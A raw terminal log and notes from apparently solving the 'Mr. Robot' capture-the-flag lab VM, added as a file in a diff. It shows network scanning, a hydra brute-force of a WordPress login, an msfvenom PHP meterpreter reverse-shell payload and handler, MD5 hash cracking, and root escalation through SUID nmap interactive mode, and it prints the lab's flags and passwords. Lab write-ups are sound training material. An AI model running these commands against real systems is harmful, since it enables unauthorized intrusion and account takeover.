@@ -1,0 +1,465 @@
+root@KaliLinux:/home/sumedh/Desktop/robot# arp-scan --local 
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:01:ac:41, IPv4: 192.168.1.11
+Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+
+192.168.1.XXX	00:0c:29:XX:XX:XX	VMware, Inc.
+192.168.X.X	XX:XX:XX:XX:XX:XX	------------
+-----------------------------------------------------------------------------------------------------------------------------------------
+root@KaliLinux:/home/sumedh/Desktop/robot# nmap -sC -sV -T4 192.168.1.XXX -oN Nmap.txt 
+PORT    STATE  SERVICE  VERSION
+22/tcp  closed ssh
+80/tcp  open   http     Apache httpd
+|_http-server-header: Apache
+|_http-title: Site doesn't have a title (text/html).
+443/tcp open   ssl/http Apache httpd
+|_http-server-header: Apache
+|_http-title: Site doesn't have a title (text/html).
+| ssl-cert: Subject: commonName=www.example.com
+| Not valid before: 2015-09-16T10:45:03
+|_Not valid after:  2025-09-13T10:45:03
+MAC Address: 00:0C:29:XX:XX:XX (VMware)
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+root@KaliLinux:/home/sumedh/Desktop/robot# wget http://192.168.1.XXX/robots
+--2020-10-06 11:29:45--  http://192.168.1.XXX/robots
+Connecting to 192.168.1.XXX:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 41 [text/plain]
+Saving to: ‘robots’
+
+robots                                    100%[=====================================================================================>]      41  --.-KB/s    in 0s      
+
+2020-10-06 11:29:45 (1.29 MB/s) - ‘robots’ saved [41/41]
+
+root@KaliLinux:/home/sumedh/Desktop/robot# wget http://192.168.1.XXX/key-1-of-3.txt
+--2020-10-06 11:30:22--  http://192.168.1.XXX/key-1-of-3.txt
+Connecting to 192.168.1.XXX:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 33 [text/plain]
+Saving to: ‘key-1-of-3.txt’
+
+key-1-of-3.txt                            100%[=====================================================================================>]      33  --.-KB/s    in 0s      
+
+2020-10-06 11:30:22 (1.20 MB/s) - ‘key-1-of-3.txt’ saved [33/33]
+
+root@KaliLinux:/home/sumedh/Desktop/robot# wget 192.168.1.XXX/fsocity.dic
+--2020-10-06 11:30:48--  http://192.168.1.XXX/fsocity.dic
+Connecting to 192.168.1.XXX:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 7245381 (6.9M) [text/x-c]
+Saving to: ‘fsocity.dic’
+
+fsocity.dic                               100%[=====================================================================================>]   6.91M  19.8MB/s    in 0.3s    
+
+2020-10-06 11:30:49 (19.8 MB/s) - ‘fsocity.dic’ saved [7245381/7245381]
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------
+#In this section, I found words are repeated so I have removed the dupicated portion:
+cat fsocity.dic |sort -u | uniq > wordlists.dic
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+#Finding Directories :
+dirbuster 192.168.1.XXX 
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+#Enumerating  to use overt discovery protocols such as ICMP and SNMP to gather information
+wpscan --url 192.168.1.XXX --enumerate vp
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+#Brutforcing Dashboard. 
+hydra -L /home/sumedh/Desktop/robot/wordlist.dic -P /home/sumedh/Desktop/robot/wordlist.dic 192.168.1.XXX -V http-form-post '/wp-login.php:log=^USER^+&pwd=^PASS^&wp-submit=Log+In:F=Invalid'
+
+#Result:
+Username : elliot
+Password : ER28–0652
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+# Exploit with the help of msfvenom
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.XX LPORT=5555 R > exploit.php
+mousepad ./exploit.php
+use multi/handler
+set payload php/meterpreter/reverse_tcp
+set LHOST 
+set lport 
+exploit
+---------------------------------------------------------------------------------------------
+#In the page of /404.php were expoted:
+curl http://192.168.1.X/404.php 
+----------------------------------------------------------------------------------------------
+#Metasploit:
+meterpreter > shell
+Process 2466 created.
+Channel 0 created.
+python -c 'import pty; pty.spawn("/bin/sh")'
+$ pwd
+pwd
+/opt/bitnami/apps/wordpress/htdocs
+$ cd ..
+cd ..
+$ ls
+ls
+bnconfig  conf	htdocs	licenses  tmp  updateip
+$ cler
+cler
+/bin/sh: 4: cler: not found
+$ clear
+clear
+TERM environment variable not set.
+$ ls
+ls
+bnconfig  conf	htdocs	licenses  tmp  updateip
+$ cd ..
+cd ..
+$ cd ..
+cd ..
+$ cd ..
+cd ..
+$ ls
+ls
+bitnami
+$ cd ..
+cd ..
+$ ls
+ls
+bin   dev  home        lib    lost+found  mnt  proc  run   srv	tmp  var
+boot  etc  initrd.img  lib64  media	  opt  root  sbin  sys	usr  vmlinuz
+$ cd home.
+cd home.
+/bin/sh: 13: cd: can't cd to home.
+$ cd home/
+cd home/
+$ ls
+ls
+robot
+$ cd robot
+cd robot
+$ ls
+ls
+key-2-of-3.txt	password.raw-md5
+$ leafpad key-2-of-3.txt
+leafpad key-2-of-3.txt
+/bin/sh: 18: leafpad: not found
+$ nano key-2-of-3.txt
+nano key-2-of-3.txt
+Error opening terminal: unknown.
+$ ls
+ls
+key-2-of-3.txt	password.raw-md5
+$ cd password.raw-md5
+cd password.raw-md5
+/bin/sh: 21: cd: can't cd to password.raw-md5
+$ ls
+ls
+key-2-of-3.txt	password.raw-md5
+$ cat key-2-of-3.txt
+cat key-2-of-3.txt
+cat: key-2-of-3.txt: Permission denied
+$ sudo robot
+sudo robot
+[sudo] password for daemon: ^C
+Terminate channel 0? [y/N]  n
+[-] core_channel_interact: Operation failed: 1
+meterpreter > clear
+[-] Unknown command: clear.
+meterpreter > back 
+[-] Unknown command: back.
+meterpreter > shell 
+Process 2482 created.
+Channel 1 created.
+python -c 'import pty; pty.spawn("/bin/sh")'
+$ ls
+ls
+admin		license.txt	      wp-cron.php
+audio		readme.html	      wp-includes
+blog		robots.txt	      wp-links-opml.php
+css		sitemap.xml	      wp-load.php
+fsocity.dic	sitemap.xml.gz	      wp-login.php
+images		video		      wp-mail.php
+index.html	wp-activate.php       wp-settings.php
+index.php	wp-admin	      wp-signup.php
+intro.webm	wp-blog-header.php    wp-trackback.php
+js		wp-comments-post.php  xmlrpc.php
+key-1-of-3.txt	wp-config.php	      you-will-never-guess-this-file-name.txt
+license.bk	wp-content
+$ cd admin
+cd admin
+$ ls
+ls
+audio  css  images  index.html	intro.webm  js	robot.tar.gz  robots.txt  video
+$ cd ..
+cd ..
+$ ls
+ls
+admin		license.txt	      wp-cron.php
+audio		readme.html	      wp-includes
+blog		robots.txt	      wp-links-opml.php
+css		sitemap.xml	      wp-load.php
+fsocity.dic	sitemap.xml.gz	      wp-login.php
+images		video		      wp-mail.php
+index.html	wp-activate.php       wp-settings.php
+index.php	wp-admin	      wp-signup.php
+intro.webm	wp-blog-header.php    wp-trackback.php
+js		wp-comments-post.php  xmlrpc.php
+key-1-of-3.txt	wp-config.php	      you-will-never-guess-this-file-name.txt
+license.bk	wp-content
+$ cat robots.txt
+cat robots.txt
+User-agent: *
+fsocity.dic
+key-1-of-3.txt
+$ cat you-will-never-guess-this-file-name.txt
+cat you-will-never-guess-this-file-name.txt
+hello there person who found me.
+$ cd ..
+cd ..
+$ ls
+ls
+bnconfig  conf	htdocs	licenses  tmp  updateip
+$ ls
+ls
+bnconfig  conf	htdocs	licenses  tmp  updateip
+$ cd ..
+cd ..
+$ ls
+ls
+bitnami  phpmyadmin  wordpress
+$ cd ..
+cd ..
+$ ls
+ls
+README.txt     common	     manager-linux-x64.run  sqlite	   var
+apache2        config	     mysql		    stats	   varnish
+apps	       ctlscript.sh  php		    uninstall
+bnconfig       img	     properties.ini	    uninstall.dat
+changelog.txt  licenses      scripts		    use_wordpress
+$ cd ..
+cd ..
+$ ls
+ls
+bitnami
+$ cd..
+cd..
+/bin/sh: 17: cd..: not found
+$ cd ..
+cd ..
+$ ls
+ls
+bin   dev  home        lib    lost+found  mnt  proc  run   srv	tmp  var
+boot  etc  initrd.img  lib64  media	  opt  root  sbin  sys	usr  vmlinuz
+$ cd ..
+cd ..
+$ ls
+ls
+bin   dev  home        lib    lost+found  mnt  proc  run   srv	tmp  var
+boot  etc  initrd.img  lib64  media	  opt  root  sbin  sys	usr  vmlinuz
+$ cd root
+cd root
+/bin/sh: 22: cd: can't cd to root
+$ cd home/
+cd home/
+$ ls
+ls
+robot
+$ cd robot
+cd robot
+$ ls
+ls
+key-2-of-3.txt	password.raw-md5
+$ cat key-2-of-3.txt
+cat key-2-of-3.txt
+cat: key-2-of-3.txt: Permission denied
+$ chmod -X key-2-of-3.txt
+chmod -X key-2-of-3.txt
+chmod: changing permissions of 'key-2-of-3.txt': Operation not permitted
+$ ls
+ls
+key-2-of-3.txt	password.raw-md5
+$ cat password.raw-md5
+cat password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+$ cls 
+cls
+/bin/sh: 31: cls: not found
+$ ls
+ls
+key-2-of-3.txt	password.raw-md5
+$ cat key-2-of-3.txt
+cat key-2-of-3.txt
+cat: key-2-of-3.txt: Permission denied
+$ cd ..
+cd ..
+$ cd ..
+cd ..
+$ ls
+ls
+bin   dev  home        lib    lost+found  mnt  proc  run   srv	tmp  var
+boot  etc  initrd.img  lib64  media	  opt  root  sbin  sys	usr  vmlinuz
+$ cd root
+cd root
+/bin/sh: 37: cd: can't cd to root
+$ ls
+ls
+bin   dev  home        lib    lost+found  mnt  proc  run   srv	tmp  var
+boot  etc  initrd.img  lib64  media	  opt  root  sbin  sys	usr  vmlinuz
+$ su robot
+su robot
+Password: abcdefghijklmnopqrstuvwxyz
+
+robot@linux:/$ ls
+ls
+bin   dev  home        lib    lost+found  mnt  proc  run   srv	tmp  var
+boot  etc  initrd.img  lib64  media	  opt  root  sbin  sys	usr  vmlinuz
+robot@linux:/$ cd root
+cd root
+bash: cd: root: Permission denied
+robot@linux:/$ cd home
+cd home
+robot@linux:/home$ ls
+ls
+robot
+robot@linux:/home$ cd robot
+cd robot
+robot@linux:~$ ls
+ls
+key-2-of-3.txt	password.raw-md5
+robot@linux:~$ cd ..
+cd ..
+robot@linux:/home$ cd ..
+cd ..
+robot@linux:/$ cd ..
+cd ..
+robot@linux:/$ cd ..
+cd ..
+robot@linux:/$ ls
+ls
+bin   dev  home        lib    lost+found  mnt  proc  run   srv	tmp  var
+boot  etc  initrd.img  lib64  media	  opt  root  sbin  sys	usr  vmlinuz
+robot@linux:/$ cd root
+cd root
+bash: cd: root: Permission denied
+robot@linux:/$ ls
+ls
+bin   dev  home        lib    lost+found  mnt  proc  run   srv	tmp  var
+boot  etc  initrd.img  lib64  media	  opt  root  sbin  sys	usr  vmlinuz
+robot@linux:/$ cd home
+cd home
+robot@linux:/home$ ls
+ls
+robot
+robot@linux:/home$ cd ..
+cd ..
+robot@linux:/$ cd ..
+cd ..
+robot@linux:/$ ls
+ls
+bin   dev  home        lib    lost+found  mnt  proc  run   srv	tmp  var
+boot  etc  initrd.img  lib64  media	  opt  root  sbin  sys	usr  vmlinuz
+robot@linux:/$ cd var
+cd var
+robot@linux:/var$ ls
+ls
+backups  cache	lib  local  lock  log  mail  opt  run  spool  tmp
+robot@linux:/var$ cd /root
+cd /root
+bash: cd: /root: Permission denied
+robot@linux:/var$ cd ..
+cd ..
+robot@linux:/$ cd ..
+cd ..
+robot@linux:/$ ls
+ls
+bin   dev  home        lib    lost+found  mnt  proc  run   srv	tmp  var
+boot  etc  initrd.img  lib64  media	  opt  root  sbin  sys	usr  vmlinuz
+robot@linux:/$ cd ..
+cd ..
+robot@linux:/$ cd ..
+cd ..
+robot@linux:/$ ls
+ls
+bin   dev  home        lib    lost+found  mnt  proc  run   srv	tmp  var
+boot  etc  initrd.img  lib64  media	  opt  root  sbin  sys	usr  vmlinuz
+robot@linux:/$ find / -perm -4000 2> /dev/null 
+find / -perm -4000 2> /dev/null 
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/pt_chown
+robot@linux:/$ !sh
+!sh
+bash: !sh: event not found
+robot@linux:/$ cd /usr/local/bin/nmap
+cd /usr/local/bin/nmap
+bash: cd: /usr/local/bin/nmap: Not a directory
+robot@linux:/$ nmap 
+nmap 
+Nmap 3.81 Usage: nmap [Scan Type(s)] [Options] <host or net list>
+Some Common Scan Types ('*' options require root privileges)
+* -sS TCP SYN stealth port scan (default if privileged (root))
+  -sT TCP connect() port scan (default for unprivileged users)
+* -sU UDP port scan
+  -sP ping scan (Find any reachable machines)
+* -sF,-sX,-sN Stealth FIN, Xmas, or Null scan (experts only)
+  -sV Version scan probes open ports determining service & app names/versions
+  -sR RPC scan (use with other scan types)
+Some Common Options (none are required, most can be combined):
+* -O Use TCP/IP fingerprinting to guess remote operating system
+  -p <range> ports to scan.  Example range: 1-1024,1080,6666,31337
+  -F Only scans ports listed in nmap-services
+  -v Verbose. Its use is recommended.  Use twice for greater effect.
+  -P0 Don't ping hosts (needed to scan www.microsoft.com and others)
+* -Ddecoy_host1,decoy2[,...] Hide scan using many decoys
+  -6 scans via IPv6 rather than IPv4
+  -T <Paranoid|Sneaky|Polite|Normal|Aggressive|Insane> General timing policy
+  -n/-R Never do DNS resolution/Always resolve [default: sometimes resolve]
+  -oN/-oX/-oG <logfile> Output normal/XML/grepable scan logs to <logfile>
+  -iL <inputfile> Get targets from file; Use '-' for stdin
+* -S <your_IP>/-e <devicename> Specify source address or network interface
+  --interactive Go into interactive mode (then press h for help)
+Example: nmap -v -sS -O www.my.com 192.168.0.0/16 '192.88-90.*.*'
+SEE THE MAN PAGE FOR MANY MORE OPTIONS, DESCRIPTIONS, AND EXAMPLES 
+robot@linux:/$ nmap --interactive
+nmap --interactive
+
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> !sh
+!sh
+# ls
+ls
+bin   dev  home        lib    lost+found  mnt  proc  run   srv	tmp  var
+boot  etc  initrd.img  lib64  media	  opt  root  sbin  sys	usr  vmlinuz
+# cd root
+cd root
+# ls
+ls
+firstboot_done	key-3-of-3.txt
+# cat key-3-of-3.txt
+cat key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
+
+---------------------------------------------------------------------------
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+
+----------------------------------------------------------------------------
+FLAG-2 : robot:c3fcd3d76192e4007dfb496cca67e13b
+After cracking : abcdefghijklmnopqrstuvwxyz
+Flag-3 : 04787ddef27c3dee1ee161b21670b4e4
+
+---------------------------------------------------------------------------
+find / -perm -4000 2> /dev/null 
+------------------------------------
+nmap 
+nmap --interactive
+!sh
+
+
+
+
